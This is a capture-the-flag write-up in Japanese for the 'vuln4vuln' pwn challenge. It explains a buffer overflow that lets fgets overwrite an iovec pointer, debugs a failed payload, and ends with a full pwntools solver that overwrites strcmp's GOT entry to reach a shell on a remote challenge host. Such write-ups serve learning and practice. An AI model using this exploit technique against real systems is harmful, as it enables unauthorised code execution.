# vuln4vuln

## 問題

Welcome! Hackers

```c
#define PASSWD "ALPACAPA\n"

char name[0x10];
char passwd[0x10];
struct iovec iov;

void win() {
    execve("/bin/sh", NULL, NULL);
}

int main() {
    iov.iov_base = passwd;
    iov.iov_len = sizeof(passwd);
    fgets(name,0x28,stdin);
    readv(STDIN_FILENO,&iov,1);
    if (strcmp(passwd, PASSWD) == 0) {
        printf("Welcome! %s\n",name);
    } else {
        printf("Wait a minute, who are you?\n");
    }
}
```

## 概要

実行するしてみると、コンソールには何も表示されませんが、ソースコードを見てみると、入力を求められているようです。

ユーザー名とパスワードのようなので、`Baumroll1234`と`ALPACAPA`を入力してみます。
```
Baumroll1234
ALPACAPA
Welcome! Baumroll1234
```
歓迎されただけで終わってしまいました。

どうしたらwin関数を呼び出してシェルを取れるのでしょうか？

## 方針

BOFを利用してiovを改ざんし、strcmpのGOTエントリを書き換える。

## 解法

`struct iovec`とか`readv`とか見慣れないものが出てきたのでまずは調べてみます。

```c
ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
```
`fd`のファイルから`iovcnt`の回数分だけ読み取って`iov`が示すバッファーに書き込むようです。

ここで、
```c
    iov.iov_base = passwd;
    iov.iov_len = sizeof(passwd);
```
より、`iov`は`passwd`を指し、
```c
    readv(STDIN_FILENO,&iov,1);
```
によって入力からpasswdに書き込み、これが`"ALPACAPA\n"`と等しい場合とそうでない場合に異なるメッセージを出して平和に終わる・・・はずでした。

しかし、nameのサイズが16バイトであるにもかかわらず、
```
    fgets(name,0x28,stdin);
```
によって0x28(=40)バイトまでの入力を許してしまっています。

これにより、`name[16]`と`passwd[16]`を飛び越えさらに`iov.iov_base`まで書き換えることができるようになっています。

※`iov.iov_len`までは届かないので16のままいくしかなさそうです。

そうすると狙いどころはやっぱりその直後に呼び出している`strcmp`のGOTエントリでしょうか。（GOTエントリの書き換えについては過去問の`Noob programmer`で覚えました！）

まず、いつものようにwin関数のアドレスとstrcmp@pltのGOTエントリを調べます。
```sh
$ objdump -d chal | grep win
00000000004011f6 <win>:
$ objdump -R chal | grep strcmp
0000000000404028 R_X86_64_JUMP_SLOT  strcmp@GLIBC_2.2.5
```

下記のペイロードを送ってみます。
```
b'a'*32 + p64(0x404028) + b'\n'
p64(0x4011f6) + p64(0) + b'\n'
b'cat /flag.txt\n'
```
すると、
```
timeout: the monitored command dumped core
```
ダメなようです。

printfを入れてデバッグしてみます。
```c
    printf("iov_base = %lx\n", iov.iov_base);
    printf("iov_len = %lu\n", iov.iov_len);
    readv(STDIN_FILENO,&iov,1);
    printf("got = %p\n", *((unsigned long *)iov.iov_base));
```
すると、
```
iov_base = 404028
iov_len = 16
got = 0x4011f60a00
```
ふむ、なるほど、改行の0x0a(LF)が書き込む値の方にはみ出してしまっているようですね。

しかもそれだけでなく0x00が１個入っているようです。

これは、fgetsの入力制限の40バイトを越えた分が次の標準入力に回された結果ですね。

そして、fgetsは終端のNULLバイトを打ち込むので、39バイト分しか消費せず、40バイト目以降が後回しにされています。

よって、

* 書き込み先のアドレスは８バイトではなく７バイトで表現する
* １回目の入力後に改行せず２回目の入力まで一気に送り付ける

必要がありそうです。

これに基づいてペイロードを修正したソルバーは下記のとおりです。
```py
from pwn import *

p = remote('34.170.146.252', 39935)

payload = b'a' * 32
payload += p64(0x404028)[:7]
payload += p64(0x4011f6) + p64(0)
payload += b'\n'
p.send(payload)

payload = b'cat /flag.txt\n'
p.send(payload)

payload = b'exit\n'
p.send(payload)

print(p.recvall().decode())
```
